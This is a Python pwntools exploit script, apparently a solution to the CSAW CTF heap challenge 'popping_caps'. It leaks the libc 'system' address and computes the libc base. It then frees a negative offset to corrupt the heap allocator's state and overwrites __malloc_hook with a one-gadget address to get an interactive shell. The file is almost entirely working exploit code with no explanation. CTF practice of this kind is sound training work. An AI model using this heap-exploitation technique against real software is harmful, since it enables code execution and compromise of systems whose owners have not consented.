from __future__ import print_function
from pwn import *

target = process('./popping_caps', env={"LD_PRELOAD":"./libc.so.6"})

#target = remote("pwn.chal.csaw.io", 1001)
libc = ELF("libc.so.6")
#gdb.attach(target, gdbscript = 'pie b *0xc44')

mallocHook = 0x3ebc30
salvation = 0x3ebb90

leak = target.recvuntil("Here is system ")
leak = target.recvline()
leak = leak.strip("\n")
leak = int(leak, 16)

libcBase = leak - libc.symbols["system"]
print("libc base: " + hex(libcBase))

def pl():
    print(target.recvuntil("Your choice:"))

def malloc(x):
    pl()
    target.sendline("1")
    print(target.recvuntil("How many:"))
    target.sendline(str(x))

def write(x):
    pl()
    target.sendline("3")
    print(target.recvuntil("Read me in:"))
    target.send(x)

def free(x):
    pl()
    target.sendline("2")
    print(target.recvuntil("Whats in a free:"))
    target.sendline(str(x))


mallocHook = libcBase + libc.symbols["__malloc_hook"]
salvation = libcBase + salvation
print("malloc hook: " + hex(libcBase + libc.symbols["__malloc_hook"]))
print("free hook: " + hex(libcBase + libc.symbols["__free_hook"]))
print("salvation: " + hex(salvation))


malloc(0x3a0)

free(0)

free(-528)

malloc(0xf0)

write(p64(mallocHook))

malloc(0x0)

write(p64(libcBase + 0x10a38c))

target.interactive()